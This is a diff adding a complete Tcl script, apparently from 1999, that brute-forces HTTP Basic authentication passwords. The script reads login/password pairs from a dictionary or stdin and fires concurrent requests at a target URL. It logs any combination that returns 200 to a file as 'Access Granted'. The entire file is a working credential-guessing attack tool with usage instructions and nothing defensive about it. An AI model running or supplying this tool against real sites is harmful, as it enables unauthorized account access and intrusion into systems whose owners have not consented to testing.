@@ -1,0 +1,248 @@
+#! /usr/bin/tclsh
+# HTTP password brute forcer on tclsh by stran9er (24 jun 1999)
+#
+# ** greetings going to ADM and w00w00 **
+#
+
+if {[package vcompare $tcl_version 7.5] == -1} {
+ puts "Too old tcl version $tcl_version"
+ exit 1
+}
+
+#globals..
+
+set b64 {ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/}
+set host {* hostname we connecting to *}
+set port {* port we connecting to *}
+set req  {* requesting file *}
+set dict {* dictionary fileid *}
+set onlyone {* stop after first found *}
+set sockets {* connections in same time *}
+set file_ok {* output filename *}
+set debug {* debug level *}
+set words {* how much l/p pairs read from dictionary *}
+set begin_time {* start time *}
+set lines 0
+
+#some functions..
+
+#base64 encode string
+proc base64 {str} {
+global b64
+ set l 0
+ foreach j "[split $str {}] {}" {
+  if {[scan $j %c i] == -1} {set i 0}
+  append o [string index $b64 [
+   switch [expr {$l % 3}] {
+    0 {expr {$i >> 2}}
+    1 {expr {(($p & 0x03) << 4) | (($i & 0xF0) >> 4)}}
+    2 {expr {(($p & 0x0F) << 2) | (($i & 0xC0) >> 6)}}
+   }
+  ]]
+  if {($l % 3) == 2} {append o [string index $b64 [expr {$i & 0x3F}]]}
+  set p $i
+  incr l
+ }
+ append o [string range A== [expr {$l % 3} != 1] [expr {$l % 3}]]
+ return $o
+}
+
+#get "login password" or "login:password" from dictionary (or stdin)
+proc get_lp {} {
+global dict words never
+ if {$never} return
+ while {![eof $dict]} {
+  gets $dict l
+  if {$l != {}} break
+ }
+ if {![info exists l] || $l == {}} return
+ incr words
+ switch -glob -- $l {
+  {* *} {set l [split $l { }]; return [lindex $l 0]:[lindex $l 1]}
+  {*:*} {return $l}
+  default {return $l:$l}
+ }
+}
+
+#tcl error handler
+proc bgerror text {
+global errorInfo
+ puts $errorInfo
+ exit 1
+}
+
+#debug output
+proc putd {level text} {
+global debug
+ if {$level <= $debug} {puts "DBG$level: $text"}
+}
+
+#one conection
+proc connect_line {{lp {}}} {
+global host port req lines never
+ incr lines
+ putd 3 "connect_line [list $lp]"
+ if {$lp == {}} {
+  if {[set lp [get_lp]] == {}} {
+   putd 2 "Dictionary end. $lines"
+   incr lines -1
+   if {!$lines} {
+    if {[after info] != {}} {
+     putd 3 "pending events: [after info]"
+     return 1
+    }
+    set never 1
+   }
+   return 1
+  }
+ }
+ if {[catch {socket $host $port} s]} {
+  putd 1 "Socket error for \[$lp\]: $s"
+  incr lines -1
+  after 1 [list connect_line $lp]
+ } {
+  putd 1 "trying: http://$lp@$host:$port$req"
+  fileevent $s readable [list http_reply $s $lp]
+  fileevent $s writable [list http_request $s $lp]
+ }
+ return 0
+}
+
+#one request
+proc http_request {s lp} {
+global req
+ putd 3 writable:$s
+ if {[catch {
+  puts $s "GET $req HTTP/1.0\nAuthorization: Basic [base64 $lp]\n"
+  flush $s
+ } er]} {putd 1 "Write error for $s: $er"}
+ fileevent $s writable {}
+}
+
+#gettin reply
+#HTTP/1.1 200 OK
+#HTTP/1.1 401 Authorization Required
+#HTTP/1.1 301 Moved Permanently
+#HTTP/1.1 404 Not Found
+#other is illegal, show them
+proc http_reply {s lp} {
+global lines
+ putd 3 readable:$s
+ if {[catch {gets $s} a]} {
+  putd 1 "http_reply:error:$s:$a"
+  connect_line $lp
+ }
+ putd 2 "answer for $lp -> $a"
+ switch -glob -- $a {
+  {* 401 *} {putd 1 "No access for \[$lp\] $a"}
+  {* 200 *} {access_granted $lp}
+  {* 404 *} {putd 0 "Not found for \[$lp\] $a"}
+  {* 302 *} - {* 301 *} {
+   set w unknown..
+   while {![eof $s]} {if {[string match Location:* [set w [gets $s]]]} break}
+   putd 0 "Moved to: [lindex [split $w { }] 1]"
+  }
+  default {putd 0 "Illegal reply for \[$lp\]: \[$a\]"}
+ }
+ catch {close $s}
+ incr lines -1
+ connect_line
+}
+
+#reply success
+proc access_granted lp {
+global req host port file_ok onlyone never
+ set url http://$lp@$host:$port$req
+ puts "*** Access Granted *** -> $url"
+ if {[
+  catch {
+   set f [open $file_ok a]
+   puts $f $url
+   close $f
+  } er]} {
+  putd 0 "Can't write $file_ok: $er"
+ }
+ if {$onlyone} {set never 1}
+}
+
+#default values
+set onlyone 0
+set debug 0
+set file_ok http.ok
+set dict -
+set sockets 1
+set words 0
+set never 0
+
+#parse options
+for {set l 0} {$l < $argc} {incr l} {
+ switch -- [lindex $argv $l] {
+  -d - -debug - debuglevel {set debug [lindex $argv [incr l]]}
+  -i - -dict - -dictfile {set dict [lindex $argv [incr l]]}
+  -1 - -stop - -first - -single - -one {set onlyone 1}
+  -t - -sock - -sockets {set sockets [lindex $argv [incr l]]}
+  -o - -out - -output {set file_ok [lindex $argv [incr l]]}
+  default {
+   if {[info exists url]} {
+    puts "Illegal argument: [lindex $argv $l]"
+    exit 1
+   }
+   set url [lindex $argv $l]
+  }
+ }
+}
+if {$l > $argc} {
+ puts "Incorrect option specified: [lindex $argv [incr l -2]]"
+ exit 1
+}
+
+#little help
+if {![info exist url]} {
+ puts "$argv0 \[-t #\]\[-stop\] \[-i dictfile\] http://www.xyz.com:81/priv/url.html"
+ puts " -i dictfile - will try all \"login password\" from dictfile else form stdin"
+ puts "    dictionary format: "
+ puts " login:passwdord - try that"
+ puts " login passwdord - try that"
+ puts " password        - try with login = password"
+ puts " -o file - on succes result going to file else to http.ok"
+ puts " -1 - stop after first found password"
+ puts " -t # - number of connections"
+ exit 1
+}
+
+#parse url
+regsub -nocase -- ^http:/* $url {} url
+if {![regexp {^([^/:]*):?([0-9]*|)(/.*|$)$} $url url host port req]} {
+ puts "Can't parse url: $url"
+ exit 1
+}
+if {$host=={}} {set port localhost}
+if {$port=={}} {set port 80}
+if {$req=={}} {set req /}
+
+putd 3 "\ndict: $dict\nhost: $host\nport: $port\nreq: $req\ndebug: $debug"
+putd 3 "sockets: $sockets\nonlyone: $onlyone\nfile_ok: $file_ok\n"
+
+if {$dict=="-"} {
+ set dict stdin
+} {
+ if {[catch {set dict [open $dict r]} er]} {
+  puts "can't open $dict: $er"
+  exit 1
+ }
+}
+
+set begin_time [clock seconds]
+
+for {set l 0} {$l < $sockets} {incr l} {connect_line}
+
+if {!$never} {
+ putd 3 "event mode"
+ vwait never
+}
+
+set seconds [expr {[clock seconds] - $begin_time}]
+incr seconds
+puts "Done. $words words tried in $seconds seconds, w/s = [expr $words./$seconds.]"
+
+#done
